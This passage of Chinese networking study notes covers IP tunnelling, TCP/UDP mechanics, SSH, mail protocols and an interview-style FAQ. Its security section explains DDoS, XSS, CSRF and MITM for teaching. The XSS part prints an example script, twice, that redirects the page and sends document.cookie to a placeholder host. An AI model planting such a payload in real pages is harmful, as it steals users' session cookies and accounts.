`10.0.0.10:1025` -> `202.244.174.37:1025`

`10.0.0.11:1025` -> `202.244.174.37:1026`

<img src="http://store.secretcamp.cn/uPic/image-20210208220612223202102082206121612793172Nl8v4qNl8v4q.png" alt="image-20210208220612223" style="zoom: 60%;" />





## IP隧道

### IP隧道的概念

IP 隧道：路由器把一种网络层协议封装到另一个协议中，从而跨过网络传送到另一个路由器的处理过程。

采用不同网络协议的网络之间无法直接通信，IP 隧道可以将网络 A 发来的 IPv6 包封装成一个数据，追加一个 IPv4 的首部再转发给网络 C，最终到达网络 B 。

<img src="http://store.secretcamp.cn/uPic/image-20210209102723539202102091027231612837643UXLHxpUXLHxp.png" alt="image-20210209102723539" style="zoom:50%;" />

### 工作机制

使用 IP 隧道封装IPv4包

<img src="http://store.secretcamp.cn/uPic/image-20210209102350259202102091023501612837430CD1SMdCD1SMd.png" alt="image-20210209102350259" style="zoom:50%;" />







# 传输层协议🔆

## 传输层的概念

传输层主要负责向两个主机中进程之间通信提供服务

IP首部中有一个协议字段，用来标识传输层使用的协议类型



## Socket

Socket（套接字）是网络中不同主机上的应用进程之间进行双向通信的端点的抽象。

应用在使用 TCP 或 UDP 通信时，会使用套接字提供的 API，可以设置对端的 IP 地址、端口号，并实现数据的发送与接收。

<img src="http://store.secretcamp.cn/uPic/image-20210209104623587202102091046231612838783QoD5WvQoD5Wv.png" alt="image-20210209104623587" style="zoom: 60%;" />



## 端口号

MAC 地址、IP 地址分别是数据链路层、网络层中的地址，端口号则是应用层的地址。

端口号也被成为程序地址，用来识别同一台计算机中进行通信的不同应用程序。

端口 + IP = Socket，一个端口不能供多个程序使用，但一个程序是可以使用多个端口。

```ruby
默认服务：
21 ftp
22 ssh
25 smtp
53 domain
80 http
443 https
```



## UDP

### UDP的概念

用户数据报协议（User Data Protocol，UDP） 是利用 IP 提供面向无连接的通信服务，并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。

在发送端，UDP 传送数据的速度仅仅是受应用程序生成数据的速度、 计算机的能力和传输带宽的限制；

在接收端，UDP 把每个消息段放在队列中，应用程序每次从队列中读一个消息段。

> 面向无连接：信息发送方不需要与接收方联系并维持一个对话，没有任何预先联系就发送消息



### UDP的应用

UDP 主要用于对高速传输和实时性有较高要求的通信和广播。

- 包总量较少的通信（DNS、SNMP等）
- 视频、音频等多媒体通信（即时通信）
- 限定于 LAN 等特定网络中的应用通信
- 广播通信（广播、多播）



### UDP首部

UDP 首部的格式：

1. 源端口号（16bit)

2. 目标端口号（16bit）

3. 数据报长度（16bit） 

   包含首部和数据。

4. 检验和（16bit）

   检验覆盖首部和数据部分。

5. 数据

<img src="http://store.secretcamp.cn/uPic/image-20210812161633881202108121616341628756194auZCAkauZCAk.png" alt="image-20210812161633881" style="zoom:50%;" />

## TCP

### TCP的概念

TCP（传输控制协议）是一种面向有连接、可靠的传输层通信协议。

> 面向有连接：只有确认通信对端存在时才会发送数据

连接：指网络中进行通信的应用程序为了相互传递消息而虚拟的一个通信线路。





### TCP首部

1. 源端口号（16bit）

   发送端端口号，`0 ~ 65535`

2. 目标端口号（16bit**）**

   接收端端口号，`0 ~ 65535`

3. 序列号（32bit）

   序列号（SEQ）是指发送数据的位置，每发送一次数据，就累加一次该数据字节数的大小。

4. 确认应答号（32bit）

确认应答号（ACK）是指下一次应该受到的数据的序列号。发送端收到确认应答之后可以认为这个序号之前的数据都被正常接收了。

5. 数据偏移（4bit）

   该字段表示 TCP 所传输的数据部分应该从TCP包的哪个位开始计算，也可以把它看作TCP首部的长度。

   该字段长4位，最高表示8，单位为4字节，即偏移量最大为32字节。

   不包括选项字段时，TCP的首部长度为20字节，因此数据偏移字段可以设置为5，说明20个字节之前是TCP首部，之后是TCP数据。

6. 保留（4bit）

为了以后扩展时使用

7. 控制位（8bit）

   字段长为8位，每一位从左至右分别为CWR、ECE、URG、ACK、PSH、RST、SYN、FIN。这些控制标志也叫做控制位。当它们对应位上的值为1时，具体含义如下：

   - ACK

   该位为1时，确认应答的字段变为有效。TCP规定除了最初建立连接时的SYN包之外该位必须设置为1。

   - SYN

     用于建立连接。SYN为1表示希望建立连接，并在其序列号的字段进行序列号初始值的设定

   - FIN

   该位为1时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换FIN位置为1的TCP段。每个主机又对对方的FIN包进行确认应答以后就可以断开连接。不过，主机收到FIN设置为1的TCP段以后不必马上回复一个FIN包，而是可以等到缓冲区中的所有数据都因已成功发送而被自动删除之后再发。

![](http://store.secretcamp.cn/uPic/TCPhead02202102111224411613017481bRH4FXbRH4FX.png)

8. 窗口大小（16bit）

9. 校验和（16bit）

10. 紧急指针（16bit）

11. 选项

    长度可变，最大40bit

<img src="http://store.secretcamp.cn/uPic/TCPhead01202102041604251612425865S6kpbKS6kpbK.png" alt="TCPhead01" style="zoom:75%;" />





### TCP的工作机制

#### 序列号与确认应答

发送端的数据到达接收端主机时，接收端主机会返回一个确认应答（ACK）

<img src="http://store.secretcamp.cn/uPic/image-20210211105414063202102111054141613012054UYrbLiUYrbLi.png" alt="image-20210211105414063" style="zoom:50%;" />

#### 重发超时

重发超时是指在重发数据之前，等待确认应答到来的那个特定时间间隔。如果超过了这个时间仍未收到确认应答，发送端将进行数据重发。

可能造成超时重发的原因有多种：

- 接收端未收到数据
- 确认应答在途中丢失
- 网络拥堵导致确认应答在触发重发后才收到

接收端可能会收到重复的包，可以通过 TCP 首部中的序列号识别，接收端查询数据包 TCP 首部中的序列号和数据长度，将自己下一步应该接收的序列号作为确认应答返回过去。

<img src="http://store.secretcamp.cn/uPic/image-20210211111418553202102111114181613013258nVi5ZynVi5Zy.png" alt="image-20210211111418553" style="zoom:67%;" />



#### **重发超时的确定**

每次发包时都会计算往返时间及其偏差，将这个往返时间和偏差相加重发超时的时间，就是比这个总和稍大一些的值。

数据被重发之后若还是收不到确认应答，则进行再次发送。此时，等待确认应答的时间将会以 2 倍、4 倍的指数函数延长。此外，数据也不会被无限、反复地重发。达到一定重发次数之后，如果仍没有任何确认应答返回，就会判断为网络或对端主机发生了异常，强制关闭连接。

<img src="http://store.secretcamp.cn/uPic/image-20210812162727158202108121627271628756847yEh6S7yEh6S7.png" alt="image-20210812162727158" style="zoom:50%;" />



#### 连接管理

TCP 的连接管理主要分为「三次握手」和「四次挥手」

<img src="http://store.secretcamp.cn/uPic/TCPcoon01202102111059211613012361KMF6JvKMF6Jv.png" style="zoom:67%;" />



##### 三次握手

三次握手是 TCP 连接的建立过程。在握手之前，主动打开连接的客户端结束 `CLOSE` 阶段，被动打开的服务器也结束 `CLOSE` 阶段，并进入 `LISTEN` 阶段，随后进入三次握手阶段。

1. 在通信之前，客户端通过 TCP 首部发送标志位为 `SYN` 的报文，作为建立 TCP 连接的请求
2. 服务端接收到 TCP 报文之后，返回首部标志位为 `SYN` 和 `ACK` 的报文，表示收到了客户端的请求以及同意建立 TCP 连接
3. 客户端接收到来自服务端的报文后，确了从客户端到服务器的数据传输是正常的，确认可以进行连接，并向服务端发送 TCP 首部标志位为 `ACK` 的报文

当服务器端收到来自客户端确认收到服务器数据的报文后，得知从服务器到客户端的数据传输是正常的，从而结束 `SYN-RECV` 阶段，进入 `ESTABLISHED` 阶段，从而完成三次握手。

<img src="http://store.secretcamp.cn/uPic/image-20210321110800921202103211108011616296081tJXXKVtJXXKV.png" alt="image-20210321110800921" style="zoom:45%;" />



##### 四次挥手

四次挥手即 TCP 连接的释放，这里假设客户端主动释放连接，在挥手之前主动释放连接的客户端结束 `ESTABLISHED` 阶段，随后开始四次挥手.

1. 首先客户端想要释放连接，向服务器端发送一段 TCP 报文，其中

   - 首部标志位为 `FIN` ，表示想要释放连接

   - 随后客户端进入 `FIN-WAIT-1` 阶段（半关闭阶段），停止向服务端发送数据，但仍能接受从服务端发来的数据

     > 这里不发送的是正常连接时传输的数据，而不是一切数据，所以客户端仍然能发送 ACK 确认报文。

2. 服务端接收到客户端请求断开连接的 FIN 报文后，确认了客户端想要释放连接，随后服务器端结束 `ESTABLISHED` 阶段，进入 `CLOSE-WAIT` 阶段（半关闭状态）并返回一段 TCP 报文，其中

   - 标记位为 `ACK` ，表示 “接收到客户端发送的释放连接的请求”
   - 客户端收到从服务器端发出的 TCP 报文之后，确认了服务器收到了客户端发出的释放连接请求，随后客户端结束 `FIN-WAIT-1` 阶段，进入 `FIN-WAIT-2` 阶段

3. 服务器端自从发出 `ACK` 确认报文之后，经过 `CLOSED-WAIT` 阶段，做好了释放服务器端到客户端方向上的连接准备，再次向客户端发出一段 TCP 报文，其中

   - 标记位为 `FIN` ，`ACK` ，表示 “已经准备好释放连接了”
   - 发送报文之后，进入 `LAST-ACK`  阶段，并且停止在服务器端到客户端的方向上发送数据，但是服务器端仍然能够接收从客户端传输过来的数据。

4. 客户端收到从服务器端发出的 TCP 报文，确认了服务器端已做好释放连接的准备，于是结束 `FIN-WAIT-2` 阶段，进入 `TIME-WAIT` 阶段，并向服务器端发送一段报文，其中：

   - 标记位为 `ACK` ，表示 “接收到服务器准备好释放连接的信号”
   - 随后客户端开始在 `TIME-WAIT` 阶段等待 2MSL（Maximum Segment Life）

<img src="http://store.secretcamp.cn/uPic/image-20210321110902873202103211109031616296143TRz2tvTRz2tv.png" alt="image-20210321110902873" style="zoom: 50%;" />







#### 最大消息长度

在建立 TCP 连接的同时，也可以确定发送数据包的单位，也可以称其为最大消息长度（MSS）。最理想的情况是，最大消息长度正好是 IP 中不会被分片处理的最大数据长度。

MSS 是在三次握于的时候，在两端主机之间计算得出。两端的主机在发出建立连接的请求时，会在 TCP 首部中写入 MSS 选项，告诉对方自己的接口能够适应的 MSS 的大小，然后会在两者之间选择一个较小的值投入使用。

显然 MSS < MTU ，即最大消息长度小于数据链路上的最大传输单位。

<img src="http://store.secretcamp.cn/uPic/TCPMSS01202102111202511613016171M4CkdjM4Ckdj.png" style="zoom:67%;" />



#### 窗口

TCP 以 1 个段为单位，每发一个段进行一次确认应答的处理，这样的传输方式有一个缺点。那就是，包的往返时间越长通信性能就越低。

TCP 引入了窗口的概念，确认应答不再是以每个分段，而是以更大的单位进行确认，转发时间会被大幅度的缩短。发送端主机在发送了一个段后不必等待确认应答，而是继续发送，这个机制使用了大量的缓冲区。

窗口大小就是不需等待确认应答而可以继续发送数据的最大值

<img src="http://store.secretcamp.cn/uPic/TCP01202102111205371613016337cWfM6zcWfM6z.png" style="zoom:75%;" />

如下图所示，窗口大小为4个段，范围是 `1001 ~ 4001` ，在这个窗口内的数据就算没有收到确认应答也能发送出去，但是数据的发送可能出现丢包，所以 `1001 ~ 4001` 的数据会被暂存在缓冲区中以备重新发送，直到收到确认应答。当收到序列号为 `2001` 数据的确认应答后，窗口滑动为 `2001 ~ 5001` ，同时清除缓冲区中序列号为 `1001` 的数据。

<img src="http://store.secretcamp.cn/uPic/TCP02202102111207121613016432hew9YXhew9YX.png" style="zoom:67%;" />



#### 窗口控制与重发控制

不使用窗口控制，如果没有收到确认应答则需要重发数据；使用窗口控制后，某些确认应答丢失了也无需重发。

如果客户端收到了序列号为 `2001` 的确认应答，那么表明服务端一定接收到了序列号为 `1001` 的数据包，那么即使没有收到序列号为 `1001` 的确认应答，客户端也无需重发数据。

<img src="http://store.secretcamp.cn/uPic/TCP032021021112080916130164898QsRZJ8QsRZJ.png" style="zoom:75%;" />



当某一报文段丢失后，接收端会一直发送上一报文段的确认应答，也就是同一个序号的确认应答会被不停地返回，如果发送端主机连续三次收到同一个确认应答，就会重发对应的数据，这被称为「高速重发机制」。

<img src="http://store.secretcamp.cn/uPic/TCP04202102111208461613016526drWWqkdrWWqk.png" style="zoom:75%;" />



#### 流控制

接收端处于高负荷的状态下难以接收数据，如果接收端将本应该接收的数据丢弃的话，就又会触发重发机制，这样就会导到网络流量的无端浪费。

TCP 提供一种机制可以让发送端根据接收端的实际接收能力控制发送的数据量。这就是所谓的「流控制」。

它的具体操作是，服务端向客户端主机通知自己可以接收数据的大小，于是客户端会发送不超过这个限度的数据。该大小限度就被称作窗口大小，其值服务端决定的。

TCP 首部中，专门有一个字段用来通知窗口大小。接收主机将自己可以接收的缓冲区大小放入这个字段中通知给发送端。这个字段的值越大，说明网络的吞吐量越高。

不过，接收端的这个缓冲区一旦面临数据溢出时，窗口大小的值也会随之被设置为一个更小的值通知给发送端，从而控制数据发送量。也就是说，客户端会根据服务端的指示，对发送数据的量进行控制。这也就形成了一个完整的 TCP 流控制。

<img src="http://store.secretcamp.cn/uPic/TCP05202102111215081613016908rnI782rnI782.png" style="zoom: 67%;" />

<img src="http://store.secretcamp.cn/uPic/TCP05202102111215431613016943FK0f8fFK0f8f.png" style="zoom:67%;" />



#### 拥塞控制

如果在 TCP 通信刚开始时就发送大量数据，则会造成网络拥堵，严重时甚至会导致网络瘫痪。

TCP 为了防止该问题的出现，在通信一开始时就会通过一个叫做「慢启动」的算法得出的数值，对发送数据量进行控制。

<img src="http://store.secretcamp.cn/uPic/TCP062021021112174016130170602qLiSE2qLiSE.png" style="zoom:67%;" />

通过慢启动算法，接收端每收到一次确认应答，拥塞窗口的值就增加1，随着包的每次往返，拥塞窗口也会以 1、2、4 等指数函数增长，到达阈值后，以以下的比例放大拥塞窗口
$$
\frac{1个数据段的字节数*1个数据段字节数}{拥塞窗口（字节）}
$$



# 路由协议🔆

互联网是由路由器连接的网络组合而成，为了能让数据包正确达地到达目标主机，路由器必须在途中进行正确地转发，这种 “争取的转发” 就被称为路由。

路由器根据路由控制表（Routing Table）转发数据包。它根据所收到的数据包中目标主机的 IP 地址与路由控制表的比较得出下一个应该接收的路由器。







# 应用层协议🔆

## 远程登录

### TELNET

TELNET 利用 TCP 的一条连接，通过这一条连接向主机发送文字命令并在主机上执行。本地用户好像直接与远程主机内部的 Shell 相连，直接在远程主机本地进行操作。

TELNET 客户端通常与远程主机的 23 端口建立连接，并与监听这个端口的服务端程序 telnetd 进行交互

<img src="http://store.secretcamp.cn/uPic/image-20210214113146271202102141131461613273506HNwer0HNwer0.png" alt="image-20210214113146271" style="zoom: 50%;" />



### SSH

SSH（Secure Shell）是一种在不安全网络上提供安全远程登录及其它安全网络服务的协议。

TELNET 中登录时无需输密码就可以发送，容易造成通信窃听和非法入侵的危险。SSH 可以加密通信内容，即使信息被窃听也无法破解所发送的密码、具体命令以及命令返回的结果是什么。



#### 基于密码认证

在非对称加密的流程中，问题的关键在于如何保证公钥是真实的而不是被篡改的。

在 HTTPS 中可以通过 CA 来进行公证，可是 SSH 的 公钥和私钥都是自己生成的，无法公证。只能通过客户端自己对公钥进行确认。通常在第一次登录的时候，系统会出现下面提示信息：

![image-20210526111350865](http://store.secretcamp.cn/uPic/image-202105261113508652021052611135116219988317rlVUA7rlVUA.png)

含义是无法确认主机 `ssh-server.example.com（12.18.429.21`）的真实性，不过知道它的公钥指纹，是否继续连接？

输入 yes 后，会确认该 host，并被追加到文件 known_hosts 中，然后就需要输入账号密码登录了。

![image-20210526112610291](http://store.secretcamp.cn/uPic/image-20210526112610291202105261126101621999570Stz5XCStz5XC.png)



❗该方案的缺点是，第一次连接到 Server 的时候，可能会受到中间人攻击，例如该公钥被中间人篡改。



#### 基于公钥认证

1. Client 将自己的公钥存放在 Server上，追加在文件 authorized_keys 中。（这一步需要手动完成）

   > 之所以将公钥存放在 Server 而不是私钥，因为 Server 上很多用户具有读权限，私钥会直接泄露。

2. Server 接收到 Client 的连接请求后，会在 authorized_keys 中匹配到 Client 用的公钥，并生成随机数 R，用 Client 的公钥对该随机数 R 进行加密，然后将加密后信息发送给 Client。

3. Client 端通过私钥进行解密得到随机数 R，然后对随机数 R 和本次会话的 SessionKey 利用 MD5 生成摘要 Digest1，发送给 Server。

4. Server 会也会对随机数 R 和 SessionKey 利用同样的算法生成 Digest2。

5. Server端会最后比较 Digest1 和 Digest2 是否相同，完成认证过程。



在 Github 中，如果要使用 SSH，就需要用户手动将公钥复制到服务器上。

<img src="http://store.secretcamp.cn/uPic/image-20210526112057976202105261120581621999258rGpAI8rGpAI8.png" alt="image-20210526112057976" style="zoom: 33%;" />



#### 端口转发

SSH 还能够将其他 TCP 端口的网络数据通过 SSH 连接来转发，并且自动提供了相应的加密及解密服务，这一过程也被叫做 “隧道”。

端口转发可以突破防火墙的限制完成一些之前无法建立的 TCP 连接，例如 MySQL 的3306端口不允许直连，但是可以通过 SSH 转发到 3306 从而操作 MySQL 。



## 文件传输

### FTP

FTP（File Transfer Protocol）是在两个相连的计算机之间进行文件传输所需要的协议。

FTP 使用两条 TCP 连接实现，一条用于控制，另一条用于数据传输。

控制用的 TCP 连接使用了 21 端口，在用户要求断开之前会一直保持连接状态（长时间没有新输入服务端会强制断开）。

数据传输用的 TCP 连接使用 20 端口，但为了安全考虑，一般使用随机数端口号。

<img src="http://store.secretcamp.cn/uPic/image-20210214142254305202102141422541613283774FhefBiFhefBi.png" alt="image-20210214142254305" style="zoom: 50%;" />



### SFTP

SFTP（Secure File Transfer Protocol）是基于 SSH 的文件传输协议。



## 电子邮件

### Email工作机制

TCP连接要求发送端和服务端同时在线，但是现实生活中往往达不到这样的要求。

于是Emali服务引入了一直在线的邮件服务器，发送和接收端通过邮件服务器进行收发邮件。

- 发送端向邮件服务器发送邮件时使用SMTP协议

- 接收端从邮件服务器接收邮件时使用POP3协议

<img src="http://store.secretcamp.cn/uPic/image-20210214143158896202102141431591613284319AiMiuxAiMiux.png" alt="image-20210214143158896" style="zoom: 50%;" />

### MIME

MIME：多用途互联网邮件扩展类型，设定某种扩展名的文件用一种应用程序打开的方式类型，即指定传输数据用哪种形式打开。

```
格式：大类型/小类型
text/plain
text/html
image/png
application/msword
```

application/x-www-form-urlencoded

`application/x-www-form-urlencoded` 是浏览器默认的编码格式，对于Get请求，是将参数转换 `?key=value&key=value` 格式，连接到url后

multipart/form-data

常用于文件等二进制，也可用于键值对参数，最后连接成一串字符传输



### SMTP

SMTP（ Simple Mail Transfer Protocol ）即简单邮件传输协议，通常使用TCP的25端口。它是一组用于从源地址到目的地址传输邮件的规范，通过它来控制邮件的中转方式，帮助每台计算机在发送或中转信件时找到下一个目的地。

SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器，SMTP认证就是要求必须在提供了账户名和密码之后才可以登录SMTP服务器。 



### POP3

POP3（ Post Office Protocol - Version 3）邮局协议第三版，是一种用于接收电子邮件的协议，发送端的邮件根据SMTP协议将被转发给一直处于在线状态的POP服务器，客户端再根据POP协议从POP服务器上接收邮件。



### IMAP

IMAP 协议与 POP 协议类似，都是接收电子邮件的协议。

在 POP 中，邮件由客户端进行管理；而在 IMAP 中，邮件则由服务器进行管理。

IMAP协议运行在 TCP/IP 协议之上，使用 143 端口。它与 POP3 协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。





# 网络安全🔆

## DDOS攻击

分布式拒绝服务（DDoS）攻击是通过大规模互联网流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。



### SYN泛洪

SYN Flood 或称 SYN 泛洪，是一种阻断服务攻击，起因于攻击者传送一系列的 SYN 请求到目标系统。

用户和服务器之间的正常连接，需要正确执行三次握手。攻击者向服务器发送很多 SYN 数据包，但不向服务器发送 ACK 数据包，因此，连接半开，只进行两次握手但不进行第三次握手，消耗服务器资源。由于阻止服务攻击，系统资源被耗尽，合法用户尝试连接到服务器但被拒绝。

服务端用一个数据空间来描述所有未决的连接， 然而这个数据空间的大小是有限的，所以攻击者将塞满这个空间。 

解决方法：

在 SYN COOKIE 的执行过程中，当服务端接收到一个 SYN 包的时，返回一个 SYN-ACK 包，这个数据包的 ACK 序列号是经过加密的，也就是说，它由源地址，端口源次序，目标地址，目标端口和一个加密种子计算得出。然后服务端释放所有的状态。如果一个ACK 包从客户端返回，服务端将重新计算它来判断它是不是上个 SYN-ACK 的返回包。如果这样，服务端就可以直接进入 TCP 连接状态并打开连接，从而使服务端避免守侯半开放连接。 



### ICMP反射泛洪

攻击者利用广播地址发送 ICMP 包，一旦广播出去，就会被广播域内的所有主机回应，当然这些包都回应给了伪装的 IP 地址（指向被攻击主机），如果不停地发送此种类型的包，就会造成 DoS 攻击。





## XSS攻击

跨站脚本攻击（Cross-Site Scripting，XSS），利用网站没有对用户提交数据进行转义处理的缺点，添加一些脚本代码嵌入到 web 页面中去，使别的用户访问都会执行相应的嵌入代码，这种代码包括 HTML 和 JavaScript 。

XSS 的思想是用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，XSS 代码可以在用户浏览器为所欲为；



例如有一个论坛网站，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie，然后攻击者就可以拿到 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。





## CSFR

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

CSRF 原理上利用的是网站服务器端所有参数都是可预先构造的原理，黑客提前拼接好具体请求 URL，可以引诱用户提交他构造好的请求。

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。



防御方法：

1. 使用验证码：有效，但是会降低用户体验

2. 使用一次性 Token：用户登录时，服务端会生成一个一次性的 Token，一般这个 Token 会保存在服务端返回给用户的页面中的一个隐藏域里。每次用户向服务端发送操作请求时会附带上这个 Token，服务端也会验证这个 Token 是否和分发给用户的 Token 一致，如果请求中不存在 Token 或 Token 不正确，即判定这个请求为非法请求。

   原理：利用了浏览器的同源策略，即第三方无法通过 AJAX 等方式获取到 Token 值。



## SQL注入攻击

服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。





## 中间人攻击

中间人攻击（Man-in-the-MiddleAttack，MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。









# FAQ🔆

## 为什么要进行第三次握手？

三次握手的主要目的是确认自己和对方的发送和接收都是正常的，从而保证了双方能够进行可靠通信。

为了实现可靠数据传输， TCP 协议的通信双方，都必须维护一个序列号，以标识发送出去的数据包中，哪些是已经被对方收到的。三次握手的过程即是通信双方相互告知序列号起始值，并确认对方已经收到了序列号起始值的必经步骤。如果只是两次握手，至多只有客户端的起始序列号能被确认，服务端的序列号则得不到确认。



## 如果三次握手的时候每次对方都没有收到会如何？

- 若第一次握手服务器未接收到数据包，服务器不会进行任何相应的动作，而客户端由于在一段时间内没有收到服务器发来的确认报文， 因此会等待一段时间后重新发送 SYN 同步报文，若仍然没有回应，则重复上述过程直到发送次数超过最大重传次数限制后，建立连接的系统调用会返回-1；

- 若第二次握手客户端未接收到服务器回应的 ACK 报文时，客户端会采取第一次握手失败时的动作，而服务器端此时将阻塞在  `accept()` 系统调用处等待客户端再次发送 ACK 报文。

- 若第三次握手服务器未接收到客户端发送过来的 ACK 报文，同样会采取类似于客户端的超时重传机制，若重传次数超过限制后仍然没有回应，则服务端 `accept()` 系统调用返回 -1，服务器端连接建立失败。但此时客户端认为自己已经连接成功了，因此开始向服务器端发送数据，但是服务器端的 `accept()` 系统调用已返回，此时没有在监听状态。因此服务器端接收到来自客户端发送来的数据时会发送 RST 报文给客户端，消除客户端单方面建立连接的状态。



## CLOSE-WAIT状态和意义？

在第二次挥手中，在服务器收到客户端关闭连接的请求并告诉客户端自己已经成功收到了该请求之后，服务器进入了 `CLOSE-WAIT` 状态，然而此时有可能服务端还有一些数据没有传输完成，因此不能立即关闭连接，而 `CLOSE-WAIT` 状态就是为了保证服务器在关闭连接之前将待发送的数据发送完成。





## TIME-WAIT的状态和意义？

`TIME-WAIT` 发生在第四次挥手，当客户端向服务端发送 ACK 确认报文后进入该状态。

- 保证 TCP 连接的正常终止

  若取消该状态，即客户端在收到服务端的 FIN 报文后立即关闭连接。但是第四次挥手客户端发送的 ACK 报文可能会丢失，由于 TCP 协议的超时重传机制，服务器会重发 FIN 报文，但是客户端已经关闭连接了，就会用 RST 包来响应服务端，表示连接错误，这将会使得服务器认为是有错误发生，然而其实只是正常的关闭连接过程。

- 防止异常连接

  若取消该状态，即客户端在收到服务端的 FIN 报文后立即关闭连接，此时服务端相应的端口并没有关闭，若客户端在相同的端口立即建立新的连接，则有可能接收到上一次连接中残留的数据包，可能会导致不可预料的异常出现。

  例如客户端用 12306 端口和服务端建立连接，假设没有 `TIME-WAIT` 阶段，客户端关闭了连接，之后又重新和服务端在 12306 端口建立了连接，这时客户端和服务端就可能接收到网络中上一次连接残留的数据包，但是此客户端已经不是之前的客户端了，这显然是不应该出现的情况。



## 客户端为什么要等待2MSL，而不是1MSL、3MSL？

MSL（Maximum Segment Life） 指一段 TCP 报文在传输过程中的最大生命周期，2MSL 即是服务器端发出为 FIN 报文和客户端发出的 ACK 确认报文所能保持有效的最大时长。

当客户端发出最后的 ACK 确认报文时，并不能确定服务器端能够收到该段报文。如果客户端在 2MSL 内，再次收到了来自服务器端的 FIN 报文，说明服务器端由于各种原因没有接收到客户端发出的 ACK 确认报文。客户端再次向服务器端发出 ACK 确认报文，计时器重置，重新开始 2MSL 的计时；



## 为什么“握手”是三次，“挥手”却要四次？

TCP 建立连接时之所以只需要 “三次握手”，是因为在第二次 “握手” 过程中，服务器端发送给客户端的 TCP 报文是以 SYN 与 ACK 作为标志位的。即 SYN 建立连接报文与 ACK 确认接收报文是在同一次 “握手” 当中传输的。

TCP 释放连接时之所以需要 “四次挥手”，是因为 FIN 释放连接报文与 ACK 确认接收报文是分别由第二次和第三次 “握手” 传输的。



## 为什么建立连接时一起传输，释放连接时却要分开传输？

建立连接时，被动方服务器端结束 `CLOSED` 阶段进入 “握手” 阶段并不需要任何准备，可以直接返回 SYN 和 ACK 报文，开始建立连接。

释放连接时，被动方服务器，突然收到主动方客户端释放连接的请求时并不能立即释放连接，因为还有必要的数据需要处理，所以服务器先返回 ACK 确认收到报文，经过 `CLOSE-WAIT` 阶段准备好释放连接之后，才能返回 FIN 释放连接报文。





## TCP粘包怎么解决

首先要明确 “TCP粘包” 到底指什么？一般是指两种

1. 多次 send 之后接收侧只 recv 了一次，多个数据报被 “粘” 在了一起。

   这实际上是个正常情况，因为 TCP 是基于字节流而不是消息包的协议，可以保证消息顺序不会乱，但是必须要字节解决字节流解析。通过设计一个带包头的应用层报文结构就能解决。包头定长，以特定标志开头，里面带着负载长度，这样接收侧只要以定长尝试读取包头，再按照包头里的负载长度读取负载就行了，多出来的数据都留在缓冲区里即可。

2. 用户数据被 TCP 发出去的时候，存在多个小尺寸数据被封装在一个 TCP 报文中发出去。

   这种 “粘” 不是接收侧的效果，而是由于 Nagle 算法（TCP_CORK）的存在，在发送的时候，就把应用开发者多次 send 的数据，“粘” 在一个 TCP 报文里面发出去了，于是，先被 send 的数据可能需要等待一段时间，才能跟后面被 send 的数据一起组成报文发出去。

    Nagle 算法是为了解决大量小报文场景下包头比负载大，导致传输性价比太低的问题而专门设计的。





## 网络的传输过程

1. 客户端 PC1 发送数据： 

   应用程序数据包 -> TCP 数据包 -> IP 数据包 -> 数据帧 -> 比特流 -> 发往路由器

   PC1 和路由器处于同一网段，需要 MAC 地址进行转发，如果 PC1 的 ARP 缓存表中没有路由器的 MAC 地址，ARP 协议获取路由器的 MAC 地址，如果有，则直接转发到路由器。

   

2. 数据到达路由器 R1： 

   将网卡到达的比特流转为数据帧，检查 MAC 地址是否是本路由器。

   如果是，解封装为 IP 数据包，检查目标 IP 地址是否是本路由器，如果不是，需要路由器进行转发，路由器查询路由控制表，将 IP 数据包再封装为数据帧（TTL减一）最后转为比特流，发送到一个相邻的网段。

   

3. 数据到达路由器 R2

   将网卡到达的比特流转为数据帧，检查 MAC 地址是否是本路由器。

   如果是，解封装为 IP 数据包，检查目标 IP 地址是否属于本网段，如果是，说明 IP 寻址完成。

   路由器根据 ARP 缓存表找到对应 PC2 的 MAC 地址，将 IP 地址封装成数据帧再转为比特流发送到对应的主机

   

4. 交换机处理

   比特流到达交换机转为数据帧，根据目标 MAC 地址查找地址转发表，将比特流发送到 PC2

   

5. 服务端 PC2 接收数据

   PC2 接收到比特流，把比特流转换成数据帧，再转为 IP 数据包，这两步会确认 MAC 地址和 IP 地址是否相同。

   IP 数据包解封装为 TCP 数据包，在传输层数据分段进行确认、排序、重组，确保数据传输的可靠性，最终传输到 PC2 的应用层。

